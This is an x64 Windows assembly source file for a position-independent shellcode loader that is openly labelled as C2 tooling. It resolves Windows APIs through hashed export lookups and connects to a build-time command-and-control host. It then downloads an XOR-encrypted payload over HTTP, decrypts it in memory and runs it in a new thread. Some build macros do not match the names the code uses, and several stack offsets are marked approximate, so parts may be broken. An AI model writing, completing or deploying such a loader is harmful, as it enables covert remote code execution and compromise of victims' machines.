; ─────────────────────────────────────────────────────────────────────────────
; C2 — PIC Shellcode Loader (x64, Windows)
; Pure position-independent shellcode — no PE header, injectable anywhere.
;
; Technique:
;   1. PEB walk  → find kernel32.dll base
;   2. Export walk (DJB2 hash) → LoadLibraryA, GetProcAddress
;   3. Load ws2_32.dll via LoadLibraryA
;   4. Resolve: WSAStartup, socket, connect, send, recv, closesocket
;   5. HTTP/1.0 GET → download XOR-encrypted payload
;   6. XOR decrypt in-place
;   7. VirtualAlloc(RW) → memcpy → VirtualProtect(RX) → CreateThread → wait
;
; Build:
;   nasm -f bin -DPAYLOAD_URL="http://1.2.3.4:8080/x.enc" \
;        -DXOR_KEY="deadbeef" -o loader.bin loader.asm
;
; The resulting .bin is raw PIC shellcode, injectable via any method.
; ─────────────────────────────────────────────────────────────────────────────

BITS 64
ORG 0

; ── Hashes (DJB2, case-insensitive) ──────────────────────────────────────────
; python3: h=5381; [h:=(h*33+ord(c.lower()))&0xFFFFFFFF for c in s]; print(hex(h))
%define HASH_LoadLibraryA    0xB7072FF1
%define HASH_GetProcAddress  0xCF31BB1B
%define HASH_VirtualAlloc    0x697A96A0
%define HASH_VirtualProtect  0x9E7C41C8
%define HASH_CreateThread    0xF0806E2F
%define HASH_WaitForSObj     0xDD23DC98  ; WaitForSingleObject
%define HASH_WSAStartup      0x6A9E87E3
%define HASH_socket          0x9ED58FD9
%define HASH_connect         0xAD26A50B
%define HASH_send            0x7C8BC481
%define HASH_recv            0x7C8BC477
%define HASH_closesocket     0x9F3B3C39

; ── Entry point ───────────────────────────────────────────────────────────────
_start:
    ; Preserve caller registers (we'll restore before returning/jumping)
    push rbp
    push rbx
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15
    sub  rsp, 0x80          ; shadow space + local vars

    ; ── Find kernel32 via PEB ──────────────────────────────────────────────
    ; GS:[0x60] = PEB
    ; PEB[0x18] = PEB_LDR_DATA
    ; PEB_LDR_DATA[0x20] = InMemoryOrderModuleList (LIST_ENTRY)
    ; Entry 0: executable, Entry 1: ntdll, Entry 2: kernel32

    mov  rax, gs:[0x60]     ; PEB
    mov  rax, [rax+0x18]    ; PEB_LDR_DATA
    mov  rax, [rax+0x20]    ; InMemoryOrderModuleList.Flink (head)
    mov  rax, [rax]         ; skip executable (entry 0)
    mov  rax, [rax]         ; skip ntdll     (entry 1)
    ; rax = LDR_DATA_TABLE_ENTRY for kernel32 (via InMemoryOrderLinks at +0x10)
    mov  r12, [rax+0x20]    ; DllBase at offset 0x20 from InMemoryOrderLinks entry
                             ; (InMemoryOrderLinks is at +0x10 in struct, so DllBase=+0x30-0x10=+0x20)
    ; r12 = kernel32.dll base

    ; ── Resolve LoadLibraryA + GetProcAddress from kernel32 ───────────────
    mov  rcx, r12
    mov  edx, HASH_LoadLibraryA
    call find_export
    mov  r13, rax            ; r13 = LoadLibraryA

    mov  rcx, r12
    mov  edx, HASH_GetProcAddress
    call find_export
    mov  r14, rax            ; r14 = GetProcAddress

    ; ── Resolve VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject
    mov  rcx, r12
    mov  edx, HASH_VirtualAlloc
    call find_export
    mov  [rsp+0x40], rax    ; store VirtualAlloc

    mov  rcx, r12
    mov  edx, HASH_VirtualProtect
    call find_export
    mov  [rsp+0x48], rax    ; store VirtualProtect

    mov  rcx, r12
    mov  edx, HASH_CreateThread
    call find_export
    mov  [rsp+0x50], rax    ; store CreateThread

    mov  rcx, r12
    mov  edx, HASH_WaitForSObj
    call find_export
    mov  [rsp+0x58], rax    ; store WaitForSingleObject

    ; ── Load ws2_32.dll ───────────────────────────────────────────────────
    call get_ws2_32_str
    db   'ws2_32', 0
get_ws2_32_str:
    pop  rcx                ; rcx = "ws2_32\0"
    call r13                ; LoadLibraryA("ws2_32")
    mov  r15, rax           ; r15 = ws2_32.dll base

    ; ── Resolve Winsock functions ─────────────────────────────────────────
    mov  rcx, r15
    mov  edx, HASH_WSAStartup
    call find_export
    mov  [rsp+0x60], rax

    mov  rcx, r15
    mov  edx, HASH_socket
    call find_export
    mov  [rsp+0x68], rax

    mov  rcx, r15
    mov  edx, HASH_connect
    call find_export
    mov  [rsp+0x70], rax

    mov  rcx, r15
    mov  edx, HASH_send
    call find_export
    mov  [rsp+0x78], rax

    mov  rcx, r15
    mov  edx, HASH_recv
    call find_export
    ; push recv (need one more slot, reuse rbp area)
    mov  rbp, rax

    mov  rcx, r15
    mov  edx, HASH_closesocket
    call find_export
    mov  [rsp+0x38], rax

    ; ── WSAStartup(0x0202, &wsadata) ─────────────────────────────────────
    sub  rsp, 0x200          ; wsadata on stack
    mov  rcx, 0x0202
    lea  rdx, [rsp]
    call qword [rsp+0x260]  ; WSAStartup (adjust offset: 0x200+0x60)
    add  rsp, 0x200

    ; ── socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6) ──────────────────
    mov  rcx, 2
    mov  rdx, 1
    mov  r8,  6
    call qword [rsp+0x68]
    mov  r15, rax            ; socket handle

    ; ── Build sockaddr_in on stack ────────────────────────────────────────
    ; sockaddr_in: sin_family(2) + sin_port(2,BE) + sin_addr(4) + pad(8)
    call get_config          ; push RIP after call, then jump to config
    ; ── Embedded config (filled at build time) ───────────────────────────
config_data:
    ; C2 IP as 4 bytes (network order): filled by build script
    db   %[C2_IP_BYTES]      ; e.g. 0x0A, 0x02, 0x14, 0xC8 for 10.2.20.200
    dw   %[C2_PORT_BE]       ; port in big-endian: e.g. 0x9090 for port 37008
    db   0, 0               ; padding
    ; XOR key (4 bytes)
xor_key_bytes:
    db   %[XOR_KEY_BYTES]    ; e.g. 0xDE, 0xAD, 0xBE, 0xEF
    ; HTTP path (null-terminated)
http_path:
    db   %[HTTP_PATH_STR], 0 ; e.g. '/x.enc'
    ; HTTP host header (null-terminated)
http_host:
    db   %[HTTP_HOST_STR], 0 ; e.g. '10.2.20.200:37008'

get_config:
    pop  rsi                 ; rsi = &config_data

    ; Build sockaddr_in at [rsp]
    sub  rsp, 0x20
    xor  eax, eax
    mov  [rsp],   ax         ; zero
    mov  word [rsp], 0x0002  ; sin_family = AF_INET
    mov  ax,  [rsi+4]        ; sin_port (big-endian, already in correct order)
    mov  [rsp+2], ax
    mov  eax, [rsi]          ; sin_addr (4 bytes network order)
    mov  [rsp+4], eax
    xor  eax, eax
    mov  [rsp+8], rax        ; padding

    ; ── connect(sock, &sockaddr_in, 16) ──────────────────────────────────
    mov  rcx, r15            ; socket
    lea  rdx, [rsp]          ; sockaddr_in
    mov  r8,  16
    call qword [rsp+0x90]   ; connect (adjust: 0x20 pushed + 0x70 offset)
    add  rsp, 0x20

    test eax, eax
    jnz  fail

    ; ── Build HTTP request ────────────────────────────────────────────────
    ; "GET /path HTTP/1.0\r\nHost: host\r\n\r\n"
    call build_http_req
    ; returns: rcx = request buffer ptr, rdx = length

    ; ── send(sock, buf, len, 0) ───────────────────────────────────────────
    mov  r8,  rdx
    mov  rdx, rcx
    mov  rcx, r15
    xor  r9,  r9
    call qword [rsp+0x78]   ; send

    ; ── recv loop → collect response ─────────────────────────────────────
    call recv_all            ; returns rax=buf ptr, rdx=total bytes

    ; ── Strip HTTP headers (find \r\n\r\n) ────────────────────────────────
    call strip_headers       ; rcx=body ptr, rdx=body size

    ; ── XOR decrypt ───────────────────────────────────────────────────────
    mov  rdi, rcx
    mov  r8,  rdx
    xor  r9,  r9
.xor_loop:
    cmp  r9,  r8
    jge  .xor_done
    movzx eax, byte [rdi+r9]
    mov  ebx, r9d
    and  ebx, 3
    movzx ecx, byte [rsi+8+rbx] ; xor_key_bytes at rsi+8
    xor  al,  cl
    mov  [rdi+r9], al
    inc  r9
    jmp  .xor_loop
.xor_done:
    mov  rcx, rdi            ; shellcode ptr
    mov  rdx, r8             ; shellcode size

    ; ── VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) ─
    push rdx
    push rcx
    sub  rsp, 0x20
    xor  rcx, rcx            ; lpAddress = NULL
    mov  rdx, [rsp+0x28]     ; size
    mov  r8,  0x3000
    mov  r9,  0x04
    call qword [rsp+0x60]   ; VirtualAlloc
    add  rsp, 0x20
    pop  rcx
    pop  rdx
    mov  rdi, rax            ; rdi = alloc'd mem

    ; ── memcpy(rdi, shellcode_ptr, size) ──────────────────────────────────
    push rdi
    push rdx
    mov  rsi, rcx
    mov  rcx, rdx
    rep  movsb
    pop  rdx
    pop  rdi

    ; ── VirtualProtect(ptr, size, PAGE_EXECUTE_READ, &old) ───────────────
    sub  rsp, 0x28
    mov  rcx, rdi
    mov  rdx, [rsp+0x28+8]  ; size (approximate)
    mov  r8,  0x20           ; PAGE_EXECUTE_READ
    lea  r9,  [rsp]
    call qword [rsp+0x70]   ; VirtualProtect
    add  rsp, 0x28

    ; ── CreateThread(NULL,0,shellcode,NULL,0,NULL) ─────────────────────
    sub  rsp, 0x30
    xor  rax, rax
    mov  [rsp+0x20], rax     ; lpThreadId = NULL
    mov  [rsp+0x28], rax     ; dwCreationFlags = 0 (already 0 but be explicit)
    xor  rcx, rcx
    xor  rdx, rdx
    mov  r8,  rdi
    xor  r9,  r9
    call qword [rsp+0x78]   ; CreateThread
    add  rsp, 0x30
    mov  rbx, rax            ; thread handle

    ; ── WaitForSingleObject(thread, INFINITE) ─────────────────────────────
    mov  rcx, rbx
    mov  rdx, 0xFFFFFFFF
    call qword [rsp+0x58]   ; WaitForSingleObject

fail:
    add  rsp, 0x80
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rsi
    pop  rdi
    pop  rbx
    pop  rbp
    ret

; ─────────────────────────────────────────────────────────────────────────────
; find_export(rcx=module_base, edx=hash) → rax=function_ptr
; DJB2 hash: h = ((h << 5) + h) + c  (case-insensitive)
; ─────────────────────────────────────────────────────────────────────────────
find_export:
    push rbx
    push rsi
    push rdi
    push r12
    push r13

    mov  r12, rcx            ; module base
    mov  r13, rdx            ; target hash

    ; Parse PE export directory
    mov  eax, [r12+0x3C]     ; e_lfanew
    mov  rsi, r12
    add  rsi, rax            ; PE header
    mov  edi, [rsi+0x88]     ; ExportDirectory RVA (optional hdr + 0x70)
    add  rdi, r12            ; ExportDirectory VA

    mov  ecx, [rdi+0x18]     ; NumberOfNames
    mov  esi, [rdi+0x20]     ; AddressOfNames RVA
    add  rsi, r12

.next_name:
    dec  ecx
    js   .not_found

    ; Get name pointer
    mov  eax, [rsi+rcx*4]
    add  rax, r12            ; name VA

    ; Compute DJB2 hash (case-insensitive)
    mov  ebx, 5381           ; hash seed
.hash_loop:
    movzx edx, byte [rax]
    test dl, dl
    jz   .hash_done
    inc  rax
    ; tolower: if A-Z, add 0x20
    cmp  dl, 0x41
    jl   .no_lower
    cmp  dl, 0x5A
    jg   .no_lower
    add  dl, 0x20
.no_lower:
    imul ebx, ebx, 33
    add  ebx, edx
    jmp  .hash_loop
.hash_done:
    cmp  ebx, r13d
    jne  .next_name

    ; Found — get ordinal and function address
    mov  esi, [rdi+0x24]     ; AddressOfNameOrdinals RVA
    add  rsi, r12
    movzx eax, word [rsi+rcx*2] ; ordinal
    mov  esi, [rdi+0x1C]     ; AddressOfFunctions RVA
    add  rsi, r12
    mov  eax, [rsi+rax*4]   ; function RVA
    add  rax, r12            ; function VA
    jmp  .done

.not_found:
    xor  rax, rax
.done:
    pop  r13
    pop  r12
    pop  rdi
    pop  rsi
    pop  rbx
    ret

; ─────────────────────────────────────────────────────────────────────────────
; build_http_req → rcx=buf, rdx=len
; ─────────────────────────────────────────────────────────────────────────────
build_http_req:
    ; Simple: build on stack (max ~512 bytes)
    sub  rsp, 0x200
    lea  rcx, [rsp]

    ; "GET "
    mov  dword [rcx], 0x20544547  ; "GET "
    add  rcx, 4

    ; copy path from config (rsi+10)
    lea  rdx, [rsi+10]
.copy_path:
    mov  al, [rdx]
    test al, al
    jz   .path_done
    mov  [rcx], al
    inc  rcx
    inc  rdx
    jmp  .copy_path
.path_done:
    ; " HTTP/1.0\r\nHost: "
    lea  rdx, [rel .http_hdr]
    jmp  .copy_hdr_str
.http_hdr db ' HTTP/1.0', 0x0D, 0x0A, 'Host: ', 0
.copy_hdr_str:
    mov  al, [rdx]
    test al, al
    jz   .hdr_done
    mov  [rcx], al
    inc  rcx
    inc  rdx
    jmp  .copy_hdr_str
.hdr_done:
    ; copy host from config
    lea  rdx, [rsi+10]
    ; skip path to find host (path is null-terminated, host follows)
.skip_path:
    mov  al, [rdx]
    inc  rdx
    test al, al
    jnz  .skip_path
.copy_host:
    mov  al, [rdx]
    test al, al
    jz   .host_done
    mov  [rcx], al
    inc  rcx
    inc  rdx
    jmp  .copy_host
.host_done:
    ; "\r\n\r\n"
    mov  dword [rcx], 0x0A0D0A0D
    add  rcx, 4
    mov  byte [rcx], 0

    lea  rcx, [rsp]
    ; compute length
    lea  rdx, [rsp]
    xor  r8, r8
.len_loop:
    cmp  byte [rdx], 0
    jz   .len_done
    inc  rdx
    inc  r8
    jmp  .len_loop
.len_done:
    mov  rdx, r8
    ; rcx already set to buf
    add  rsp, 0x200
    ret

; ─────────────────────────────────────────────────────────────────────────────
; recv_all → rax=buf, rdx=size  (allocates on heap via VirtualAlloc)
; ─────────────────────────────────────────────────────────────────────────────
recv_all:
    sub  rsp, 0x38
    ; Allocate 8MB receive buffer
    xor  rcx, rcx
    mov  rdx, 0x800000
    mov  r8,  0x3000
    mov  r9,  0x04
    call qword [rsp+0x58]   ; VirtualAlloc
    mov  [rsp+0x20], rax    ; save buf ptr
    xor  r12, r12           ; total received = 0

.recv_chunk:
    mov  rcx, r15            ; socket
    mov  rdx, [rsp+0x20]
    add  rdx, r12            ; buf + offset
    mov  r8d, 0x10000        ; 64KB per recv
    xor  r9,  r9
    call rbp                 ; recv() — rbp holds recv ptr
    test eax, eax
    jle  .recv_done
    add  r12, rax
    jmp  .recv_chunk

.recv_done:
    mov  rax, [rsp+0x20]
    mov  rdx, r12
    add  rsp, 0x38
    ret

; ─────────────────────────────────────────────────────────────────────────────
; strip_headers(rax=buf, rdx=size) → rcx=body, rdx=body_size
; Finds \r\n\r\n and returns pointer after it
; ─────────────────────────────────────────────────────────────────────────────
strip_headers:
    mov  rcx, rax
    mov  r8,  rdx
    xor  r9,  r9
.scan:
    cmp  r9, r8
    jge  .no_hdr
    cmp  dword [rcx+r9], 0x0A0D0A0D
    je   .found
    inc  r9
    jmp  .scan
.found:
    add  r9, 4
    add  rcx, r9
    sub  r8,  r9
    mov  rdx, r8
    ret
.no_hdr:
    ; No header found — treat entire buffer as body
    mov  rdx, r8
    ret
